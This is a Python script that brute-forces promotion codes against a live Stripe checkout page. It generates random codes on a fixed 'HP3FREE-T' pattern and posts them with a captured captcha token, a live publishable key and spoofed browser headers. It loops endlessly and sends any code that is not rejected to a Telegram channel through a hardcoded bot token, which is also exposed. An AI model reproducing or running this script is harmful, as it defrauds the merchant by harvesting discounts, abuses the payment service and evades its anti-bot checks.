import requests
import random
import string
import telebot
####bot spam ###
tok = "8128789997:AAHIE70sQCwEZYPt7p90uLLg5RUHrIYnyxU"
ch_id = "7037898496"
botA = telebot.TeleBot(token=tok)
def test():
	fixed_part = "HP3FREE-T"
	chars = string.ascii_uppercase + string.digits
	
	z = (
	    fixed_part +
	    random.choice(chars) +
	    random.choice(chars) +
	    "B" +
	    random.choice(chars)
	)
	print(z)
	url = "https://api.stripe.com/v1/payment_pages/cs_live_b1gjM7FiTcUcCrmKF0yGvoTfOZqzkLKwwtoewgUuAHoAdoUuXcyxPS0vgQ"
	
	payload = {
	  'eid': "NA",
	  'promotion_code': "HP3FREE-TZEBS",
	  'passive_captcha_token': "P1_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZCI6MCwiZXhwIjoxNzg3MDMwNTY3LCJjZGF0YSI6Ijk3VlhiVldmRjlhSlQ1RWFRTmdwL3V1TjBvNlBLd1JmN2g2ZmJpUVd4YjI3NHpjZHVwSjJOM3ZuQjAvWG1JanYxUEhBZTY3LzJYTzc1cUpkbEw2MUQ4LzE2ZHFRUVdGbjlyNTRjMndJOUx0ZE02QVBTWkZsdVZURU83cEJrS1BkZkFnYWhJSWlIeUxNakZtNVNrdDZOempOWkQvdkZ0MG4xMk9FaXNpZzB1MWM0bE9Fa2lRQUswZTFwWmVEd2lmT1pZZ3FiUTBnYzFlRjRVSVNLeDFOVjRDczFxaGpPYzZraUhmdktxVnV2akcvNEZQM3lJSzBsN09LU1NDYk9Jck5NVTRNNEU5NC92ZjRXU2JuL1d6ZGw1a1N2ejZLRlFMWG84cW1qL09tVGMwSHE4QkVKQ0Uwby9uTWFnZ1YzeTB6ekNOT2dBVXdhN1hJZk43NkhpUGtlajN0aGpYNVBaY2F0bkM4S1ppMVNBS0lBZlk0WUlSeGtQUnp1TDI3YUlUTGtPUm9uTVFEb0M5QW5lWW5ZSGVqcDJzNlhGTlNtemw0OUZiSXRKdG1qS1cvNVNIVVdEUnM4djBuQjdJPUN2enRFUU1hR0N6cDdUZTkiLCJwYXNza2V5IjoieFdHc21Cb25vUkR6QkdXQkNJWU9OZFRMVDhLK0NFdzhuNTNzZ2FJc3Q5NUNhQmNaYzB5Y0NyYSttK0tsREMybXg3S3J0bzU0cHkxMWlhZ2VIRmNlWENVdEdWVEI4V0hKa0FVRHZDODhyd3gyd2dDZEpWQmZrUTByRDlvRGlwc1BlUWJNUHYxM1BRajUyY3hKeFltOWFJamJNRzczRXlBTEM5YmZieVdkeDNuNUU5eVBBSjVIa2ZJVGlHL0loc2Jzb3lkRFVlOVc2bjZKR2dlbkVPUFpvWDNxRWhxZ0NkYlE1YkFvMHMxWXRFdVFOV3hkUG0xZUxUVWxBcHZUMHhWMzFlM3dEWFhjUkJMRUFOZDlaM0xnS1I3TFZkb0NHbm8rVHNqSkNoQVdHS1FzdEI2Y01lcnZHcWhWNnN5UFJWTzd4OUZpN21jU3hBWTFaYmgrbmtocEtwM3d6UUxOQVJVN2w2am51TFZUNHpMVTYwWHNweFVzNWNSS2NnSXJ1YzNJcGhhUVZQeGJPMHg2SjFNTHNra0lKQmpnd3JRbGVEY3pBZmd0RjlILzNTaXNJQS9QUElMM09GbTFkVCtQcW9vUHhNcUNpQ00vSUVqcGxuMGJvbFZMak1Ub0ZYQTkxdzZReWFxQkt5MkV5ZjZnN3hyRlJHWmZQc090MGkyb2ZVWDJ4Q0ZuUllrUjMzY3VNV0xKRTk3ZlBwNkhSc2lVQ0psVTdYSWpHKzA2WnVQc0pOWGhWbjAyRHdUaEVqc1F1bjVaWjFEcGlZTlYyOHZUcUgyZC9OdnRxdnJLWjVENENYMm9rbGtTcmpVTGptMGdPNUVuVWNpb1RHL1prN2VBYjhYckNWWHZxcXJXMWtuZXMyL1hsWnlrOVI5UVJvYk9DQmtNbS9Gai9EaWtxWXZDUnpzQmpKekxlYm5SMHk1YnlpeFBGdm1IU3FvNC9nZTFGZTBPcTNxc1AxaVdXYkpVRXg2blM3OUViQ05VbVZYRHozZmJLaVkySmlqTkNYRUZ4RXZFKzNZMnUraHVBNlZNMFVTeHZuaU1SeXNCNjJvZEdOdkpoR0djcXozVi9EUVlSZE9XZDg2SUFNSHFzMENQOTVkb3ZESHpaSmt2NWU3dEd4TlFGVWt0czNDMlErQmdzVVNRQVZGbWloVm1oUU1ra1ZrRzJnNm1lVDI5RTVXeTBZRVJEM1lmRFBlaVp4TmRiYk9oR2dYK1RSS2p4M2F3WXhlQXNZeDVTTENRaTV5azB1TXhRK01DcDZGR09QbnJ4WlNnUUJjSjYxYTlRWVI5R285dXQ4cm5DQzY0SHhkYkVrZnhwSmRDZHplSkN5SnNhcmFaYVRrS1NxbmlydCtqUmZZOFBQQzF3bkJmSkx6Z09NVUxuaDBqYlR3dHNzL2Rid3Z6NGM4RmJHTXdRaGxIZDdaT3BMdVJ3UGNmb1BhS1dVd3V4UTNOWk81aTV6NmFVQWVtYndCaHptYXhla08vb0pmNTNSY1NXRVl2T1padHN3L1VpekdGaVdMK2N4dXk4SkpvL0hVSGNvUnJjR045eFN1djlVYnRQcHN3bE05M2I4aDNENjBTNzRxRW9zQWNkYXJzOEVIYjBwMERyYkVHb1RTeko0TXNhQnI2ajQ5eDQxSWdUbEorbjZ4RkFpY2ZSUTVKdytuM2RWMVFSWjRLRU1NdE5GaG9BUUxYMjN0UzNHbTV2SThJbElSMmRaK0IvRFBkM2xtUEJZbzh1YTMxOE9Qb2dhYVBrVUhNaVo5TFdISHZKTHBUM0UxUlFZcjdndEFZOVBLSEpVTm42ZTVtWFVIbnMwYnlSUU84am9hbkN5UEZxVnUzaDRGQlgvOTlMQlBRT2Z0d2N5Q2pXQjRrLzlMNWt4R3pPUDZuUWpnODZlU0dobHpRS01SM0hyMm1vbk1GbFpvSmMwTE9IWW9XMEluTWhLbnN5VE4vVHJLQ1ZXTG1Fd1hYcTIwbFdzUEpiZlJLU0RYWGVwSWVrSHFLMENzYnFCODVycUdPQ2RGbTZhOU9tNVozdlNqK1FmU0Z2eitKQjhPZGl4eHpBcWRaTFBhRE9kNUFoN3M1cE12Sjd0cGtzdFFmYkJSKzhUVHNrd2JlWDJvWCtSVFhZUHV4UDNqUnJ2RFY3WHBIME1NQTZER0xJRXlsL0tEdms0ZnMveW1mSU9pZHZtR1ZUcFRrOHBTK0UyN25pTGM5YUp6ZXV5WnlBUisrMjJJRmVOcWJ5V2tHTm9pVHVGc1FRYUdZdzVOdTU4RjFpTlFqajBvYXZPRXdUZEVKM3dwVGs1Zll1M2dHbGdzVm13dFJqV0l4azlBeHQwYXRKWmE3OWZXb2J1aEQ5U1k0L0RTUnl5aEN3SVpPS3hPLzZNRHdFRGhlQ1RxSEYyZVRLZUZnM1RmblRiSnFlZk0wYnM2Rm1NK0tBb2VmMXJBOFlPcWFuUnZDTDU4TXhwOERVZGFGbG9nZitMTUZaMk9VNWFxeElDeW9zVUNMR1NMMSt1OGxDbytZTnZJVVB6L3hEWnZ4ZFpqcXhBVDZkSmdzWWVrS1RGYU53WlBVVVdicWRSOGhONzNOdkd2NmVyNXljY3pJL2RzaGVFeDgxc1FrNStGdHlXVi9aSjExMUhheE1xU0VsTnM1M010ZnkzVSs0THNXQUdKczFoTmxkdEdQZ1hidFJ4UnJVeVVQMnlSMGlXaThZMyt2Y1R3MGx6andlaEdlS1o3RmMxYkVWTDlPUmRzb0VQNFpmSjZlTGplQW92U1FtTThUOEcxekpkN1hEOTlSTjhLT0M2Um5yV3lnUmUzUDlFZkdoYjRBaWFzS0x5VmNUZnZYUnBzcFZMd201TGFjWHVoKzZMN1ZCaFBzUzV2ckNOVGF1MDRvZmFTcGsrUjNCVGVGQTNOdDdGYnhwSzZhckxhVVVtWlBXaFpVK0w5a0lVVVJGRVBEIiwia3IiOiIzYmY5NjM2YSIsInNoYXJkX2lkIjo1MzU3NjU1OX0.SuPMnlF2t9rnOICOrTHeDpIEj48oKCFd0hAtds46Zok",
	  'passive_captcha_ekey': "",
	  'key': "pk_live_51LNh3DDIvHNr5wfC3AK3lD9Smr5Xt4cbIkIDA0pFcBSsS09PB7bdaH7l2y6JZJGIFshg4moyOEPvZhbmYg6hFrJ800uSwwp8oJ"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
	  'Accept': "application/json",
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'sec-ch-ua-platform': "\"Linux\"",
	  'sec-ch-ua': "\"Not=A?Brand\";v=\"99\", \"Google Chrome\";v=\"151\", \"Chromium\";v=\"151\"",
	  'sec-ch-ua-mobile': "?0",
	  'origin': "https://checkout.stripe.com",
	  'sec-fetch-site': "same-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://checkout.stripe.com/",
	  'accept-language': "ar,en;q=0.9,de;q=0.8",
	  'priority': "u=1, i"
	}
	
	response = requests.post(url, data=payload, headers=headers).text
	if "This promotion code is invalid." in response:
		print("Bad")
	else:
		print(response)
		botA.send_message(chat_id=ch_id, text=z)
		botA.send_message(chat_id=ch_id, text=response)		
while True:
	try:
		test()
	except:pass
